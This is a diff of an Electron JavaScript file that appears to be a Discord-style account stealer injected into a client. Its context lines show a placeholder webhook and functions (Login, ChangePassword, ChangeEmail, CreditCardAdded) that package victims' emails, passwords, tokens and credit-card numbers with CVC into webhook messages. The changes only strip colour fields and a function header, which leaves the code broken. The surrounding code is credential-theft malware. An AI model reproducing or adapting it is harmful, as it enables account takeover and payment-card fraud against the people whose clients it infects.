@@ -4,7 +4,6 @@ const { BrowserWindow, session } = require('electron')
 const querystring = require('querystring');
 var webhook = "%WEBHOOK_LINK%";
 
-function FirstTime() {
     if (!fs.existsSync(path.join(__dirname, "0x709078bbd7d68f295a63ea1734e33d"))) {
         return !0
     }
@@ -149,7 +148,6 @@ function Login(email, password, token) {
             avatar_url: "",
             embeds: [
                 {
-                    "color": "BLACK",
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -194,7 +192,6 @@ function ChangePassword(oldpassword, newpassword, token) {
                 avatar_url: "",
                 embeds: [
                     {
-                        "color": "BLACK",
                         "fields": [
                             {
                                 "name": "**Password Changed**",
@@ -247,7 +244,6 @@ function ChangeEmail(newemail, password, token) {
                 avatar_url: "",
                 embeds: [
                     {
-                        "color": "BLACK",
                         "fields": [
                             {
                                 "name": "**Email Changed**",
@@ -301,7 +297,6 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                 avatar_url: "",
                 embeds: [
                     {
-                        "color": "BLACK",
                         "fields": [
                             {
                                 "name": "**Credit Card Added**",
@@ -354,7 +349,6 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                 avatar_url: "",
                 embeds: [
                     {
-                        "color": "BLACK",
                         "fields": [
                             {
                                 "name": "**Credit Card Added**",
